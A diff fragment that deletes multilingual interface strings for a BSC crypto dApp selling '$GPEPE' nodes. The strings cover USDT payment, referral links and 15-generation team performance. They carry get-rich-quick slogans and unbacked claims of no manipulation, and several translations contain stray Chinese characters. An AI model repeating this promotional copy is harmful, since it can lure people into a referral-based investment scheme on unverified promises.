-        phase4Item1: '跨链桥上线',
-        phase4Item2: '衍生品发行',
-        phase4Item3: '机构级托管',
-        buyNode: '购买节点',
-        pleaseConnect: '请先连接钱包',
-        pleaseInstall: '请安装 MetaMask 钱包',
-        insufficientBalance: 'USDT余额不足！需要: ',
-        balanceOk: '余额充足',
-        approving: '正在授权USDT...',
-        approveSuccess: '授权成功',
-        transferring: '正在转账 ',
-        transferSuccess: '支付成功！',
-        pleaseSwitch: '请切换到 BSC 网络',
-        cancel: '用户取消',
-        error: '错误',
-        armySubtitle: '加入黄金軍團',
-        armyDesc: '告别 FOMO，拥抱黄金共识。做情绪稳定的暴富者。',
-        footerDesc: '加入黄金军团，做情绪稳定的暴富者。 💎',
-        myReferral: '分享给好友，绑定推荐关系',
-        referrer: '我的推荐人地址',
-        copyLink: '📋 复制链接',
-        copySuccess: '链接已复制！'
-      },
-      en: {
-        subtitle: 'Diamond Hands · Golden Consensus',
-        tagline1: '💎 Through Bull & Bear, Break the Norm',
-        tagline2: '💎 Building True "Golden Consensus" on BSC',
-        connectWallet: '💎 Connect Wallet',
-        walletStatus: 'Not Connected',
-        connected: '✅ Connected',
-        myNodes: 'My Nodes',
-        directTeam: '1st Gen Team',
-        totalTeam: '15th Gen Total',
-        nodePrice: 'Node Price',
-        buyGold: '💎 Buy Gold Node Now',
-        buySilver: '⚪ Buy Silver Node Now',
-        buyCommunity: '🌱 Buy Community Node Now',
-        buyLight: '🔹 Buy Light Node Now',
-        whyGpepe: 'Why Golden?',
-        greenPepe: 'Green Pepe',
-        greenDesc: 'FOMO chasing, trapped at the top. Buy high, sell low.',
-        blackPepe: 'Black Pepe',
-        blackDesc: 'Panic selling, cutting losses. Buy and it drops.',
-        goldPepe: 'Golden Pepe',
-        goldDesc: 'The ultimate awakening. Rock solid, diamond hands never let go.',
-        mechanismSub: 'NO BULLSHIT, JUST CODE.',
-        mechanismSub2: '100% Community Driven, Code is Law.',
-        noCabal: 'No Cabal',
-        noCabalDesc: 'Rules are written in smart contracts. No manipulation.',
-        communityWhale: 'Community = Whale',
-        communityWhaleDesc: 'Every buy, hold, and share shapes $GPEPE\'s destiny.',
-        onChain: 'On-chain Autopilot',
-        onChainDesc: 'Liquidity, settlement, participation - all transparent on-chain.',
-        openSource: 'Open Source Contract',
-        openSourceDesc: 'Contract code is auditable, community governed.',
-        liquidity: 'Liquidity Injection',
-        community: 'Community',
-        goldRule: 'Golden Rule · Community First',
-        roadmapSub: 'THE GOLDEN PATH',
-        roadmapSub2: 'The Path to the Golden Throne',
-        phase1: 'PHASE 1 - The Awakening',
-        phase1Title: 'The Awakening',
-        phase1Item1: 'Contract Deployment · Audit',
-        phase1Item2: 'Liquidity Injection',
-        phase1Item3: 'Launch 1,000 Nodes',
-        phase2: 'PHASE 2 - The Storm',
-        phase2Title: 'The Storm',
-        phase2Item1: 'Community Building',
-        phase2Item2: 'Multi-language Expansion',
-        phase2Item3: 'CMC Listing',
-        phase3: 'PHASE 3 - The Throne',
-        phase3Title: 'The Throne',
-        phase3Item1: 'CEX Listing',
-        phase3Item2: 'DAO Governance',
-        phase3Item3: 'Ecosystem Launch',
-        phase4: 'PHASE 4 - The Empire',
-        phase4Title: 'The Empire',
-        phase4Item1: 'Cross-chain Bridge',
-        phase4Item2: 'Derivatives Launch',
-        phase4Item3: 'Institutional Grade',
-        buyNode: 'Buy Node',
-        pleaseConnect: 'Please connect wallet first',
-        pleaseInstall: 'Please install MetaMask',
-        insufficientBalance: 'Insufficient USDT balance! Need: ',
-        balanceOk: 'Balance OK',
-        approving: 'Approving USDT...',
-        approveSuccess: 'Approval successful',
-        transferring: 'Transferring ',
-        transferSuccess: 'Payment successful!',
-        pleaseSwitch: 'Please switch to BSC network',
-        cancel: 'User cancelled',
-        error: 'Error',
-        armySubtitle: 'Join The Golden Army',
-        armyDesc: 'Say goodbye to FOMO. Embrace Golden Consensus. Be a calm wealth builder.',
-        footerDesc: 'Join the Golden Army, be a calm wealth builder. 💎',
-        myReferral: 'Share with friends, bind referral relationship',
-        referrer: 'My referrer address',
-        copyLink: '📋 Copy Link',
-        copySuccess: 'Link copied!'
-      },
-      ko: {
-        subtitle: '다이아몬드 핸즈 · 황금 공감',
-        tagline1: '💎 불황과 호황을 넘어, 규칙을 깨다',
-        tagline2: '💎 BSC에서 진정한 "황금 공감"을 구축하라',
-        connectWallet: '💎 지갑 연결',
-        walletStatus: '연결 안 됨',
-        connected: '✅ 연결됨',
-        myNodes: '내 노드 수',
-        directTeam: '1대 팀 실적',
-        totalTeam: '15대 총 실적',
-        nodePrice: '노드 가격',
-        buyGold: '💎 황금 노드 구매',
-        buySilver: '⚪ 은 노드 구매',
-        buyCommunity: '🌱 커뮤니티 노드 구매',
-        buyLight: '🔹 라이트 노드 구매',
-        whyGpepe: '왜 황금인가?',
-        greenPepe: '그린 페페',
-        greenDesc: 'FOMO로 높은 가격에 사서 속았다. 오르면 사고, 내리면 팔고.',
-        blackPepe: '블랙 페페',
-        blackDesc: '공황 판매로 손실을 보았다. 산 뒤 오르고, 팔면 내린다.',
-        goldPepe: '골든 페페',
-        goldDesc: '최종 각성. 불굴의 다이아몬드 핸즈.',
-        mechanismSub: '헛소리는 없다, 코드만이 진실.',
-        mechanismSub2: '100% 커뮤니티 주도, 코드가 법이다.',
-        noCabal: '카발이 없다',
-        noCabalDesc: '규칙이 스마트 컨트랙트에 기록되어 있다.',
-        communityWhale: '커뮤니티 = 고래',
-        communityWhaleDesc: '매 구매, 보유, 전파가 $GPEPE의 운명을 결정한다.',
-        onChain: '온체인 자동 조종',
-        onChainDesc: '유동성, 결제, 참여 모두 투명하게 실행된다.',
-        openSource: '오픈 소스 계약',
-        openSourceDesc: '계약 코드는 감사 가능하며, 커뮤니티가 통치한다.',
-        liquidity: '유동성 주입',
-        community: '커뮤니티',
-        goldRule: '황금의 법칙 · 커뮤니티 최우선',
-        roadmapSub: '황금의 길',
-        roadmapSub2: '황금 왕좌로 가는 길',
-        phase1: 'PHASE 1 - 황금 각성',
-        phase1Item1: '계약 배포 · 감사',
-        phase1Item2: '유동성 주입',
-        phase1Item3: '1,000 노드 출시',
-        phase2: 'PHASE 2 - 황금 폭풍',
-        phase2Item1: '커뮤니티 구축',
-        phase2Item2: '다국어 커뮤니티 확장',
-        phase2Item3: 'CMC 등재',
-        phase3: 'PHASE 3 - 황금 왕좌',
-        phase3Item1: 'CEX 상장',
-        phase3Item2: 'DAO 거버넌스 시작',
-        phase3Item3: '생태계 출시',
-        phase4: 'PHASE 4 - 황금 제국',
-        phase4Item1: '크로스체인 브릿지',
-        phase4Item2: '파생상품 출시',
-        phase4Item3: '기관급 서비스',
-        buyNode: '노드 구매',
-        pleaseConnect: '지갑을 먼저 연결하세요',
-        pleaseInstall: 'MetaMask를 설치하세요',
-        insufficientBalance: 'USDT 잔액 부족! 필요: ',
-        balanceOk: '잔액 충분',
-        approving: 'USDT 승인 중...',
-        approveSuccess: '승인 성공',
-        transferring: '이체 중 ',
-        transferSuccess: '결제 성공!',
-        pleaseSwitch: 'BSC 네트워크로 전환하세요',
-        cancel: '사용자 취소',
-        error: '오류',
-        armySubtitle: '황금 군단에 가입하라',
-        armyDesc: 'FOMO를 버리고 황금 공감을 받아라. 차분한 부자 되기.',
-        footerDesc: '황금 군단에 가입하라, 차분한 부자가 되어라. 💎',
-        myReferral: '친구에게 공유하여 추천 관계를 맺으세요',
-        referrer: '나의 추천인 주소',
-        copyLink: '📋 링크 복사',
-        copySuccess: '링크가 복사되었습니다!'
-      },
-      ja: {
-        subtitle: 'ダイヤモンドハンズ・ゴールデンコンセンサス',
-        tagline1: '💎 ブル＆ベアを超え、常識を覆す',
-        tagline2: '💎 BSC上に真の「黄金のコンセンサス」を構築',
-        connectWallet: '💎 ウォレットを接続',
-        walletStatus: '未接続',
-        connected: '✅ 接続済み',
-        myNodes: 'マイノード数',
-        directTeam: '1世代チーム',
-        totalTeam: '15世代合計',
-        nodePrice: 'ノード価格',
-        buyGold: '💎 ゴールドノード購入',
-        buySilver: '⚪ シルバーノード購入',
-        buyCommunity: '🌱 コミュニティノード購入',
-        buyLight: '🔹 ライトノード購入',
-        whyGpepe: 'なぜ黄金か？',
-        greenPepe: 'グリーンペペ',
-        greenDesc: 'FOMOで高値買い。上がれば買い、下がれば慌てる。',
-        blackPepe: 'ブラックペペ',
-        blackDesc: 'パニック売りで損切り。買えば上がり、売れば下がる。',
-        goldPepe: 'ゴールデンペペ',
-        goldDesc: '究極の目覚め。不動のダイヤモンドハンズ。',
-        mechanismSub: 'ブルシットはない、コードだけが真実。',
-        mechanismSub2: '100%コミュニティ主導、コードが法である。',
-        noCabal: 'カバルはいない',
-        noCabalDesc: 'ルールはスマートコントラクトに刻まれている。',
-        communityWhale: 'コミュニティ＝クジラ',
-        communityWhaleDesc: '毎回の購入、保有、伝播が$GPEPEの運命を決定する。',
-        onChain: 'オンチェーンオートパイロット',
-        onChainDesc: '流動性、決済、参加、すべて透明に実行。',
-        openSource: 'オープンソースコントラクト',
-        openSourceDesc: 'コントラクトコードは監査可能、コミュニティ自治。',
-        liquidity: '流動性注入',
-        community: 'コミュニティ',
-        goldRule: '黄金の法則・コミュニティ至上',
-        roadmapSub: '黄金の道',
-        roadmapSub2: '黄金の玉座への道',
-        phase1: 'PHASE 1 - 黄金の目覚め',
-        phase1Item1: 'コントラクトデプロイ・監査',
-        phase1Item2: '流動性注入',
-        phase1Item3: '1,000ノードローンチ',
-        phase2: 'PHASE 2 - 黄金の嵐',
-        phase2Item1: 'コミュニティ構築',
-        phase2Item2: '多言語コミュニティ拡大',
-        phase2Item3: 'CMC上場',
-        phase3: 'PHASE 3 - 黄金の玉座',
-        phase3Item1: 'CEX上場',
-        phase3Item2: 'DAOガバナンス開始',
-        phase3Item3: 'エコシステムリリース',
-        phase4: 'PHASE 4 - 黄金の帝国',
-        phase4Item1: 'クロスチェーンブリッジ',
-        phase4Item2: 'デリバティブリリース',
-        phase4Item3: '機関級サービス',
-        buyNode: 'ノード購入',
-        pleaseConnect: 'ウォレットを接続してください',
-        pleaseInstall: 'MetaMaskをインストールしてください',
-        insufficientBalance: 'USDT残高不足！必要: ',
-        balanceOk: '残高OK',
-        approving: 'USDT承認中...',
-        approveSuccess: '承認成功',
-        transferring: '転送中 ',
-        transferSuccess: '支払い成功！',
-        pleaseSwitch: 'BSCネットワークに切り替えてください',
-        cancel: 'ユーザーキャンセル',
-        error: 'エラー',
-        armySubtitle: 'ゴールデンアーミーに加入',
-        armyDesc: 'FOMOを捨て、黄金のコンセンサスを抱け。冷静な富の構築者になれ。',
-        footerDesc: 'ゴールデンアーミーに加入し、冷静な富の構築者になれ。 💎',
-        myReferral: '友達に共有し、紹介関係を結びましょう',
-        referrer: '私の紹介者アドレス',
-        copyLink: '📋 リンクをコピー',
-        copySuccess: 'リンクをコピーしました！'
-      },
-      th: {
-        subtitle: 'แฮนด์เพชร · ความเห็นชอบทองคำ',
-        tagline1: '💎 ข้ามตลาดตกต่ำและสูง, ทำลายกฎเก่า',
-        tagline2: '💎 สร้าง"ความเห็นชอบทองคำ"ที่แท้จริงบน BSC',
-        connectWallet: '💎 เชื่อมต่อวอลเล็ต',
-        walletStatus: 'ยังไม่เชื่อมต่อ',
-        connected: '✅ เชื่อมต่อแล้ว',
-        myNodes: 'จำนวนโหนดของฉัน',
-        directTeam: '業績ทีมรุ่นแรก',
-        totalTeam: '業績รวม15รุ่น',
-        nodePrice: 'ราคาโหนด',
-        buyGold: '💎 ซื้อโหนดทองคำ',
-        buySilver: '⚪ ซื้อโหนดเงิน',
-        buyCommunity: '🌱 ซื้อโหนดชุมชน',
-        buyLight: '🔹 ซื้อโหนดไลท์',
-        whyGpepe: 'ทำไมเป็นทองคำ?',
-        greenPepe: 'กรีนเปปเป้',
-        greenDesc: 'FOMO ซื้อสูง, ติดอยู่บนยอด. ขึ้นก็จับ, ลงก็จ่อ.',
-        blackPepe: 'แบล็คเปปเป้',
-        blackDesc: 'ขายด้วยความกลัว, ตัดขาด. ซื้อแล้วขึ้น, ขายแล้วลง.',
-        goldPepe: 'โกลเด้นเปปเป้',
-        goldDesc: 'การตื่นขึ้นสุดท้าย. แข็งแรงเหมือนแร่เพชร.',
-        mechanismSub: 'ไม่มีคำโกหก, โค้ดเท่านั้น.',
-        mechanismSub2: '100% ชุมชนขับเคลื่อน, โค้ดคือกฎหมาย.',
-        noCabal: 'ไม่มีกลุ่มลับ',
-        noCabalDesc: 'กฎเขียนอยู่ในสมาร์ทคอนแทรค, ไม่มีคนสามารถแก้ไขได้.',
-        communityWhale: 'ชุมชน = วาฬ',
-        communityWhaleDesc: 'การซื้อ, การถือ, การแพร่กระจายทุกครั้งกำหนดโชคชะตาของ $GPEPE.',
-        onChain: 'ออทอพายลอตในเชน',
-        onChainDesc: 'ดุลยภาพ, การชำระเงิน, การมีส่วนร่วม, ทั้งหมดโปร่งใสบนเชน.',
-        openSource: 'คอนแทรคโอเพ่นซอร์ส',
-        openSourceDesc: 'โค้ดคอนแทรคเปิดเผยต่อสาธารณะ, ชุมชนอภิสิทธิ์.',
-        liquidity: 'การฉีดดุลยภาพ',
-        community: 'ชุมชน',
-        goldRule: 'กฎทองคำ · ชุมชนเป็นอันดับแรก',
-        roadmapSub: 'ทางทองคำ',
-        roadmapSub2: 'ทางสู่บัลลังก์ทองคำ',
-        phase1: 'PHASE 1 - การตื่นขึ้นทองคำ',
-        phase1Item1: 'การปรับใช้คอนแทรค · การตรวจสอบ',
-        phase1Item2: 'การฉีดดุลยภาพ',
-        phase1Item3: 'เปิดตัวโหนด 1,000',
-        phase2: 'PHASE 2 - พายุทองคำ',
-        phase2Item1: 'การสร้างชุมชน',
-        phase2Item2: 'ขยายชุมชนหลายภาษา',
-        phase2Item3: 'ลงทะเบียน CMC',
-        phase3: 'PHASE 3 - บัลลังก์ทองคำ',
-        phase3Item1: 'ลงทะเบียน CEX',
-        phase3Item2: 'เริ่มการปกครอง DAO',
-        phase3Item3: 'เปิดตัวระบบนิเวศ',
-        phase4: 'PHASE 4 - จักรวรรดิทองคำ',
-        phase4Item1: 'สะพานข้ามเชน',
-        phase4Item2: 'เปิดตัวผลิตภัณฑ์พืช',
-        phase4Item3: 'บริการระดับสถาบัน',
-        buyNode: 'ซื้อโหนด',
-        pleaseConnect: 'กรุณาเชื่อมต่อวอลเล็ต',
-        pleaseInstall: 'กรุณาติดตั้ง MetaMask',
-        insufficientBalance: 'ยอด USDT ไม่เพียงพอ! ต้องการ: ',
-        balanceOk: 'ยอดเพียงพอ',
-        approving: 'กำลังอนุมัติ USDT...',
-        approveSuccess: 'อนุมัติสำเร็จ',
-        transferring: 'กำลังโอน ',
-        transferSuccess: 'ชำระเงินสำเร็จ!',
-        pleaseSwitch: 'กรุณาเปลี่ยนเป็นเครือข่าย BSC',
-        cancel: 'ผู้ใช้ยกเลิก',
-        error: 'ข้อผิดพลาด',
-        armySubtitle: 'เข้าร่วมกองทัพทองคำ',
-        armyDesc: 'ลาก่อน FOMO, ครอบงำความเห็นชอบทองคำ. เป็นผู้สร้างความมั่งคั่งที่มีความสงบ.',
-        footerDesc: 'เข้าร่วมกองทัพทองคำ, เป็นผู้สร้างความมั่งคั่งที่มีความสงบ. 💎',
-        myReferral: 'แชร์ให้เพื่อน, ผูกพันความสัมพันธ์แนะนำ',
-        referrer: 'ที่อยู่แนะนำของฉัน',
-        copyLink: '📋 คัดลอกลิงค์',
-        copySuccess: 'คัดลอกลิงค์เรียบร้อย!'
-      },
-      vi: {
-        subtitle: 'Diamond Hands · Công đồng Vàng',
-        tagline1: '💎 Vượt qua bò熊市và bò牛市, phá vỡ quy tắc',
-        tagline2: '💎 Xây dựng "Công đồng Vàng" thực thụ trên BSC',
-        connectWallet: '💎 Kết nối ví',
-        walletStatus: 'Chưa kết nối',
-        connected: '✅ Đã kết nối',
-        myNodes: 'Số nút của tôi',
-        directTeam: '业績 Đội ngũ thế hệ 1',
-        totalTeam: '业績 Tổng cộng 15 thế hệ',
-        nodePrice: 'Giá nút',
-        buyGold: '💎 Mua nút Vàng',
-        buySilver: '⚪ Mua nút Bạc',
-        buyCommunity: '🌱 Mua nút Cộng đồng',
-        buyLight: '🔹 Mua nút Nhẹ',
-        whyGpepe: 'Tại sao là Vàng?',
-        greenPepe: 'Green Pepe',
-        greenDesc: 'FOMO mua cao, bị mắc trên đỉnh. Tăng thì mua, giảm thì hoảng.',
-        blackPepe: 'Black Pepe',
-        blackDesc: 'Bán hoảng sợ, cắt lỗ. Mua xong tăng, bán xong giảm.',
-        goldPepe: 'Golden Pepe',
-        goldDesc: 'Sự tỉnh ngộ cuối cùng. Bền vững như kim cương.',
-        mechanismSub: 'Không có trò lừa, chỉ có code.',
-        mechanismSub2: '100% Cộng đồng dẫn dắt, code là luật.',
-        noCabal: 'Không có phe nhóm',
-        noCabalDesc: 'Quy tắc được viết死 trong smart contract.',
-        communityWhale: 'Cộng đồng = Cá voi',
-        communityWhaleDesc: 'Mỗi lần mua, giữ, lan truyền đều quyết định số phận của $GPEPE.',
-        onChain: 'Tự động điều khiển trên chuỗi',
-        onChainDesc: 'Thánh khoản, thanh toán, tham gia đều thực hiện minh bạch trên chuỗi.',
-        openSource: 'Contract mã nguồn mở',
-        openSourceDesc: 'Mã contract công khai, cộng đồng tự trị.',
-        liquidity: 'Điều chỉnh thanh khoản',
-        community: 'Cộng đồng',
-        goldRule: 'Quy tắc Vàng · Cộng đồng hàng đầu',
-        roadmapSub: 'Đường Vàng',
-        roadmapSub2: 'Đường đến Ngai vàng',
-        phase1: 'PHASE 1 - Sự tỉnh ngộ Vàng',
-        phase1Item1: 'Triển khai contract · Đánh giá',
-        phase1Item2: 'Điều chỉnh thanh khoản',
-        phase1Item3: 'Khởi động 1,000 nút',
-        phase2: 'PHASE 2 - Bão Vàng',
-        phase2Item1: 'Xây dựng cộng đồng',
-        phase2Item2: 'Mở rộng cộng đồng đa ngôn ngữ',
-        phase2Item3: 'Đăng ký CMC',
-        phase3: 'PHASE 3 - Ngai Vàng',
-        phase3Item1: 'Giao dịch CEX',
-        phase3Item2: 'Khởi động quản trị DAO',
-        phase3Item3: 'Phát hành ứng dụng sinh thái',
-        phase4: 'PHASE 4 - Đế quốc Vàng',
-        phase4Item1: 'Cầu chéo chuỗi',
-        phase4Item2: 'Phát hành phái sinh',
-        phase4Item3: 'Dịch vụ cấp tổ chức',
-        buyNode: 'Mua nút',
-        pleaseConnect: 'Vui lòng kết nối ví',
-        pleaseInstall: 'Vui lòng cài đặt MetaMask',
-        insufficientBalance: 'Số dư USDT không đủ! Cần: ',
-        balanceOk: 'Số dư OK',
-        approving: 'Đang phê duyệt USDT...',
-        approveSuccess: 'Phê duyệt thành công',
-        transferring: 'Đang chuyển tiền ',
-        transferSuccess: 'Thanh toán thành công!',
-        pleaseSwitch: 'Vui lòng chuyển sang mạng BSC',
-        cancel: 'Người dùng hủy',
-        error: 'Lỗi',
-        armySubtitle: 'Tham gia Quân đội Vàng',
-        armyDesc: 'Tạm biệt FOMO, nắm bắt Công đồng Vàng. Trở thành người xây dựng giàu có một cách bình tĩnh.',
-        footerDesc: 'Tham gia Quân đội Vàng, trở thành người xây dựng giàu có một cách bình tĩnh. 💎',
-        myReferral: 'Chia sẻ cho bạn bè, kết nối quan hệ giới thiệu',
-        referrer: 'Địa chỉ người giới thiệu của tôi',
-        copyLink: '📋 Sao chép liên kết',
-        copySuccess: 'Đã sao chép liên kết!'
-      },
-      id: {
-        subtitle: 'Diamond Hands · Konsensus Emas',
-        tagline1: '💎 Menembus Pasar Bull & Bear, Memecahkan Aturan',
-        tagline2: '💎 Membangun "Konsensus Emas" Nyata di BSC',
-        connectWallet: '💎 Hubungkan Wallet',
-        walletStatus: 'Belum Terhubung',
-        connected: '✅ Terhubung',
-        myNodes: 'Jumlah Node Saya',
-        directTeam: '业绩 Tim Generasi 1',
-        totalTeam: '业绩 Total 15 Generasi',
-        nodePrice: 'Harga Node',
-        buyGold: '💎 Beli Node Emas',
-        buySilver: '⚪ Beli Node Perak',
-        buyCommunity: '🌱 Beli Node Komunitas',
-        buyLight: '🔹 Beli Node Ringan',
-        whyGpepe: 'Mengapa Emas?',
-        greenPepe: 'Green Pepe',
-        greenDesc: 'FOMO membeli tinggi, terperangkap di puncak. Naik beli, turun panik.',
-        blackPepe: 'Black Pepe',
-        blackDesc: 'Jual panik, potong rugi. Beli lalu naik, jual lalu turun.',
-        goldPepe: 'Golden Pepe',
-        goldDesc: 'Kebangkitan akhir. Kokoh seperti berlian.',
-        mechanismSub: 'Tidak Ada Bohong, Hanya Kode.',
-        mechanismSub2: '100% Dikemudikan Komunitas, Kode Adalah Hukum.',
-        noCabal: 'Tidak Ada Cabal',
-        noCabalDesc: 'Aturan ditulis dalam smart contract.',
-        communityWhale: 'Komunitas = Paus',
-        communityWhaleDesc: 'Setiap pembelian, pemegangan, penyebaran menentukan nasib $GPEPE.',
-        onChain: 'Otonomi On-chain',
-        onChainDesc: 'Likuiditas, penyelesaian, partisipasi - semuanya transparan on-chain.',
-        openSource: 'Kontrak Open Source',
-        openSourceDesc: 'Kode kontrak dapat diaudit, komunitas otonom.',
-        liquidity: 'Injeksi Likuiditas',
-        community: 'Komunitas',
-        goldRule: 'Aturan Emas · Komunitas Terutama',
-        roadmapSub: 'Jalan Emas',
-        roadmapSub2: 'Jalan ke Tahta Emas',
-        phase1: 'PHASE 1 - Kebangkitan Emas',
-        phase1Item1: 'Penempatan Kontrak · Audit',
-        phase1Item2: 'Injeksi Likuiditas',
-        phase1Item3: 'Luncurkan 1,000 Node',
-        phase2: 'PHASE 2 - Badai Emas',
-        phase2Item1: 'Pembangunan Komunitas',
-        phase2Item2: 'Ekspansi Komunitas Multibahasa',
-        phase2Item3: 'Pendaftaran CMC',
-        phase3: 'PHASE 3 - Tahta Emas',
-        phase3Item1: 'Pencatatan CEX',
-        phase3Item2: 'Pemulihan Tata Kelola DAO',
-        phase3Item3: 'Peluncuran Ekosistem',
-        phase4: 'PHASE 4 - Kekaisaran Emas',
-        phase4Item1: 'Jembatan Cross-chain',
-        phase4Item2: 'Peluncuran Derivatif',
-        phase4Item3: 'Layanan Tingkat Institusi',
-        buyNode: 'Beli Node',
-        pleaseConnect: 'Silakan hubungkan wallet',
-        pleaseInstall: 'Silakan instal MetaMask',
-        insufficientBalance: 'Saldo USDT tidak mencukupi! Butuh: ',
-        balanceOk: 'Saldo OK',
-        approving: 'Menyetujui USDT...',
-        approveSuccess: 'Persetujuan berhasil',
-        transferring: 'Mentransfer ',
-        transferSuccess: 'Pembayaran berhasil!',
-        pleaseSwitch: 'Silakan beralih ke jaringan BSC',
-        cancel: 'Pengguna membatalkan',
-        error: 'Kesalahan',
-        armySubtitle: 'Bergabung dengan Tentara Emas',
-        armyDesc: 'Sambut baik Konsensus Emas. Jadilah pembangun kekayaan yang tenang.',
-        footerDesc: 'Bergabung dengan Tentara Emas, jadilah pembangun kekayaan yang tenang. 💎',
-        myReferral: 'Bagikan ke teman, ikat hubungan referral',
-        referrer: 'Alamat referer saya',
-        copyLink: '📋 Salin tautan',
-        copySuccess: 'Tautan disalin!'
-      },
-      ms: {
-        subtitle: 'Diamond Hands · Konsensus Emas',
-        tagline1: '💎 Melampaui Pasaran Bull & Bear, Memecahkan Peraturan',
-        tagline2: '💎 Membangun "Konsensus Emas" Nyata di BSC',
-        connectWallet: '💎 Sambungkan Wallet',
-        walletStatus: 'Belum Disambung',
-        connected: '✅ Disambung',
-        myNodes: 'Jumlah Node Saya',
-        directTeam: '业绩 Pasukan Generasi 1',
-        totalTeam: '业绩 Jumlah 15 Generasi',
-        nodePrice: 'Harga Node',
-        buyGold: '💎 Beli Node Emas',
-        buySilver: '⚪ Beli Node Perak',
-        buyCommunity: '🌱 Beli Node Komuniti',
-        buyLight: '🔹 Beli Node Ringan',
-        whyGpepe: 'Mengapa Emas?',
-        greenPepe: 'Green Pepe',
-        greenDesc: 'FOMO membeli tinggi, terperangkap di puncak. Naik beli, turun panik.',
-        blackPepe: 'Black Pepe',
-        blackDesc: 'Jual panik, potong rugi. Beli lalu naik, jual lalu turun.',
-        goldPepe: 'Golden Pepe',
-        goldDesc: 'Bangunan akhir. Kokoh seperti berlian.',
-        mechanismSub: 'Tiada Bohong, Hanya Kod.',
-        mechanismSub2: '100% Dipimpin Komuniti, Kod Adalah Undang-Undang.',
-        noCabal: 'Tiada Cabal',
-        noCabalDesc: 'Peraturan ditulis dalam smart contract.',
-        communityWhale: 'Komuniti = Ikan Paus',
-        communityWhaleDesc: 'Setiap pembelian, pemegangan, penyebaran menentukan nasib $GPEPE.',
-        onChain: 'Autopilot On-chain',
-        onChainDesc: 'Liquiditi, penyelesaian, penyertaan - semua telus on-chain.',
-        openSource: 'Kontrak Open Source',
-        openSourceDesc: 'Kod kontrak boleh audit, komuniti autonomi.',
-        liquidity: 'Injeksi Liquiditi',
-        community: 'Komuniti',
-        goldRule: 'Peraturan Emas · Komuniti Utama',
-        roadmapSub: 'Jalan Emas',
-        roadmapSub2: 'Jalan ke Tahta Emas',
-        phase1: 'PHASE 1 - Kebangkitan Emas',
-        phase1Item1: 'Penempatan Kontrak · Audit',
-        phase1Item2: 'Injeksi Liquiditi',
-        phase1Item3: 'Lancarkan 1,000 Node',
-        phase2: 'PHASE 2 - Badai Emas',
-        phase2Item1: 'Pembangunan Komuniti',
-        phase2Item2: 'Ekspansi Komuniti Berbilang Bahasa',
-        phase2Item3: 'Pendaftaran CMC',
-        phase3: 'PHASE 3 - Tahta Emas',
-        phase3Item1: 'Pendaftaran CEX',
-        phase3Item2: 'Permulaan Tadbir DAO',
-        phase3Item3: 'Pelancaran Ekosistem',
-        phase4: 'PHASE 4 - Empayar Emas',
-        phase4Item1: 'Jambatan Cross-chain',
-        phase4Item2: 'Pelancaran Derivatif',
-        phase4Item3: 'Perkhidmatan Institusi',
-        buyNode: 'Beli Node',
-        pleaseConnect: 'Sila sambungkan wallet',
-        pleaseInstall: 'Sila pasang MetaMask',
-        insufficientBalance: 'Baki USDT tidak mencukupi! Perlu: ',
-        balanceOk: 'Baki OK',
-        approving: 'Mengesahkan USDT...',
-        approveSuccess: 'Pengesahan berjaya',
-        transferring: 'Memindahkan ',
-        transferSuccess: 'Pembayaran berjaya!',
-        pleaseSwitch: 'Sila tukar ke rangkaian BSC',
-        cancel: 'Pengguna membatalkan',
-        error: 'Ralat',
-        armySubtitle: 'Gabung Tentera Emas',
-        armyDesc: 'Sambut Konsensus Emas. Jadilah pembina kekayaan yang tenang.',
-        footerDesc: 'Gabung Tentera Emas, jadilah pembina kekayaan yang tenang. 💎',
-        myReferral: 'Kongsi kepada rakan, ikatkan hubungan rujukan',
-        referrer: 'Alamat rujukan saya',
-        copyLink: '📋 Salin pautan',
-        copySuccess: 'Pautan disalin!'
-      },
-      ru: {
-        subtitle: 'Даймонд Хендз · Золотой Консенсус',
-        tagline1: '💎 Сквозь быки и медведи, ломая правила',
-        tagline2: '💎 Строим истинный "Золотой Консенсус" на BSC',
-        connectWallet: '💎 Подключить кошелек',
-        walletStatus: 'Не подключено',
-        connected: '✅ Подключено',
-        myNodes: 'Мои ноды',
-        directTeam: '业绩 Команда 1-го поколения',
-        totalTeam: '业绩 Всего 15 поколений',
-        nodePrice: 'Цена ноды',
-        buyGold: '💎 Купить Золотую ноду',
-        buySilver: '⚪ Купить Серебряную ноду',
-        buyCommunity: '🌱 Купить Сообщественную ноду',
-        buyLight: '🔹 Купить Лёгкую ноду',
-        whyGpepe: 'Почему Золото?',
-        greenPepe: 'Грин Пепе',
-        greenDesc: 'FOMO, покупаешь дорого, застреваешь на вершине. Рост - покупка, падение - паника.',
-        blackPepe: 'Блэк Пепе',
-        blackDesc: 'Паника, продажа с убытком. Покупаешь - растёт, продаёшь - падает.',
-        goldPepe: 'Золотой Пепе',
-        goldDesc: 'Истинное пробуждение. Твёрдый как алмаз.',
-        mechanismSub: 'Нет бреда, только код.',
-        mechanismSub2: '100% сообщество управляет, код - закон.',
-        noCabal: 'Нет Кабала',
-        noCabalDesc: 'Правила записаны в смарт-контракте.',
-        communityWhale: 'Сообщество = Кит',
-        communityWhaleDesc: 'Каждая покупка, удержание, распространение определяет судьбу $GPEPE.',
-        onChain: 'Он-чейн Автопилот',
-        onChainDesc: 'Ликвидность, расчёты, участие - всё прозрачно на цепочке.',
-        openSource: 'Открытый Код Контракта',
-        openSourceDesc: 'Код контракта проверяем, сообщество самоуправляется.',
-        liquidity: 'Инъекция Ликвидности',
-        community: 'Сообщество',
-        goldRule: 'Золотое Правило · Сообщество Первое',
-        roadmapSub: 'Золотой Путь',
-        roadmapSub2: 'Путь к Золотому Трону',
-        phase1: 'PHASE 1 - Золотое Пробуждение',
-        phase1Item1: 'Развёртывание Контракта · Аудит',
-        phase1Item2: 'Инъекция Ликвидности',
-        phase1Item3: 'Запуск 1,000 Нод',
-        phase2: 'PHASE 2 - Золотая Буря',
-        phase2Item1: 'Строительство Сообщества',
-        phase2Item2: 'Расширение Многоязычного Сообщества',
-        phase2Item3: 'Добавление в CMC',
-        phase3: 'PHASE 3 - Золотой Трон',
-        phase3Item1: 'Листинг на CEX',
-        phase3Item2: 'Запуск DAO Управления',
-        phase3Item3: 'Релиз Экосистемы',
-        phase4: 'PHASE 4 - Золотая Империя',
-        phase4Item1: 'Кросс-чейн Мост',
-        phase4Item2: 'Релиз Производных',
-        phase4Item3: 'Институциональный Уровень',
-        buyNode: 'Купить Ноду',
-        pleaseConnect: 'Пожалуйста, подключите кошелек',
-        pleaseInstall: 'Пожалуйста, установите MetaMask',
-        insufficientBalance: 'Недостаточно USDT! Нужно: ',
-        balanceOk: 'Баланс OK',
